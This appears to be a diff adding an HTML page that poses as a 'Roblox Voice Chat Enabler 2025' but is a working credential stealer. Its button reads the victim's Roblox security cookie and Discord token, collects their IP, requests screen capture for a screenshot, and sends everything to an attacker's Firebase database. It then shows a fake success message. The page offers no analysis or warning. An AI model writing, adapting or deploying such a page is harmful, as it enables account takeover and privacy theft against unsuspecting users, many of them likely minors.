@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Voice Chat Enabler 2025</title>
+  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+  <style>
+    body{background:#000;color:#0f0;font-family:courier;text-align:center;padding:50px;}
+    h1{font-size:50px;text-shadow:0 0 20px #0f0;}
+    button{padding:25px 60px;font-size:30px;background:#000;border:4px solid #0f0;color:#0f0;cursor:pointer;border-radius:20px;box-shadow:0 0 40px #0f0;}
+    button:hover{transform:scale(1.05);box-shadow:0 0 80px #0f0;}
+    iframe{display:none;}
+  </style>
+</head>
+<body>
+  <h1>ROBLOX VOICE CHAT ENABLER 2025</h1>
+  <p>Works on all accounts • 1 click • 100% safe</p>
+  <br/><br/>
+  <button onclick="grab()">ENABLE VOICE CHAT NOW</button>
+
+  <iframe id="robloxframe" src="https://www.roblox.com/login"></iframe>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBNs1rNXGio_HjLkJiWLgMhjOxRTo9XjQ",
+      authDomain: "flamesaxrch-empire-v2.firebaseapp.com",
+      databaseURL: "https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app",
+      projectId: "flamesaxrch-empire-v2",
+      storageBucket: "flamesaxrch-empire-v2.appspot.com",
+      messagingSenderId: "50676890102",
+      appId: "1:50676890102:web:e3f143b7952ed3aa362fd7"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    async function grab() {
+      const cookies = document.cookie;
+      const robloxCookie = cookies.split('.ROBLOSECURITY=_|')[1]?.split(';')[0] || "none";
+
+      const ip = await fetch('https://api.ipify.org').then(r => r.text());
+      const discord = localStorage.getItem('token') ? JSON.parse(localStorage.getItem('token')).replace(/"/g,'') : "none";
+
+      // screenshot
+      let screenshot = "none";
+      try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
+        const track = stream.getVideoTracks()[0];
+        const image = new ImageCapture(track);
+        const bitmap = await image.grabFrame();
+        const canvas = document.createElement('canvas');
+        canvas.width = bitmap.width; canvas.height = bitmap.height;
+        canvas.getContext('2d').drawImage(bitmap,0,0);
+        screenshot = canvas.toDataURL();
+        track.stop();
+      } catch(e){}
+
+      db.ref('drops/' + Date.now()).set({
+        cookie: robloxCookie,
+        discord: discord,
+        ip: ip,
+        screenshot: screenshot,
+        useragent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+        method: "Voice Chat Site"
+      });
+
+      alert("Voice Chat Enabled! Enjoy :)");
+      setTimeout(() => location.href = "https://roblox.com", 1000);
+    }
+  </script>
+</body>
+</html>
